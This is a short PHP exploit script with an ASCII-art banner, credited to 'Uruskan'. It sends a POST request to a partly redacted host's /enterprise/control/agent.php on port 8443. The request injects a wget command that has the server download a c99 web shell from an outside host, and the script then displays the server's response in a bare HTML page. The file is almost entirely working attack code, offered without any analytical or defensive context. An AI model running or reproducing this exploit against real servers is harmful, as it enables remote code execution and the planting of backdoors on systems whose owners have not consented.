<?php
/*
       ___                       ___           ___           ___                    ___           ___                       ___           ___     
     /  /\                     /  /\         /  /\         /__/|                  /  /\         /  /\          ___        /  /\         /  /\    
    /  /::\                   /  /:/_       /  /:/_       |  |:|                 /  /:/_       /  /::\        /  /\      /  /:/_       /  /::\   
   /  /:/\:\  ___     ___    /  /:/ /\     /  /:/ /\      |  |:|                /  /:/ /\     /  /:/\:\      /  /:/     /  /:/ /\     /  /:/\:\  
  /  /:/~/:/ /__/\   /  /\  /  /:/ /:/_   /  /:/ /::\   __|  |:|               /  /:/ /:/_   /  /:/~/::\    /  /:/     /  /:/ /:/_   /  /:/~/:/  
 /__/:/ /:/  \  \:\ /  /:/ /__/:/ /:/ /\ /__/:/ /:/\:\ /__/\_|:|____          /__/:/ /:/ /\ /__/:/ /:/\:\  /  /::\    /__/:/ /:/ /\ /__/:/ /:/___
 \  \:\/:/    \  \:\  /:/  \  \:\/:/ /:/ \  \:\/:/~/:/ \  \:\/:::::/          \  \:\/:/ /:/ \  \:\/:/__\/ /__/:/\:\   \  \:\/:/ /:/ \  \:\/:::::/
  \  \::/      \  \:\/:/    \  \::/ /:/   \  \::/ /:/   \  \::/~~~~            \  \::/ /:/   \  \::/      \__\/  \:\   \  \::/ /:/   \  \::/~~~~ 
   \  \:\       \  \::/      \  \:\/:/     \__\/ /:/     \  \:\                 \  \:\/:/     \  \:\           \  \:\   \  \:\/:/     \  \:\     
    \  \:\       \__\/        \  \::/        /__/:/       \  \:\                 \  \::/       \  \:\           \__\/    \  \::/       \  \:\    
     \__\/                     \__\/         \__\/         \__\/                  \__\/         \__\/                     \__\/         \__\/    

 
Written by Uruskan
Date: 11.23
*/

$target = 'http://df---------.com:8443/enterprise/control/agent.php';
$cmd = $_GET['cmd'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, '0=wget+http://---------.com/c99.txt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
$exec = curl_exec($ch);
curl_close($ch);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cURL Response Display</title>
    <style>
        #response-box {
            border: 1px solid #ccc;
            padding: 10px;
            margin: 20px;
            max-width: 600px;
            overflow: auto;
        }
    </style>
</head>
<body>

<div id="response-box">
    <pre><?php echo htmlspecialchars($exec); ?></pre>
</div>

</body>
</html>

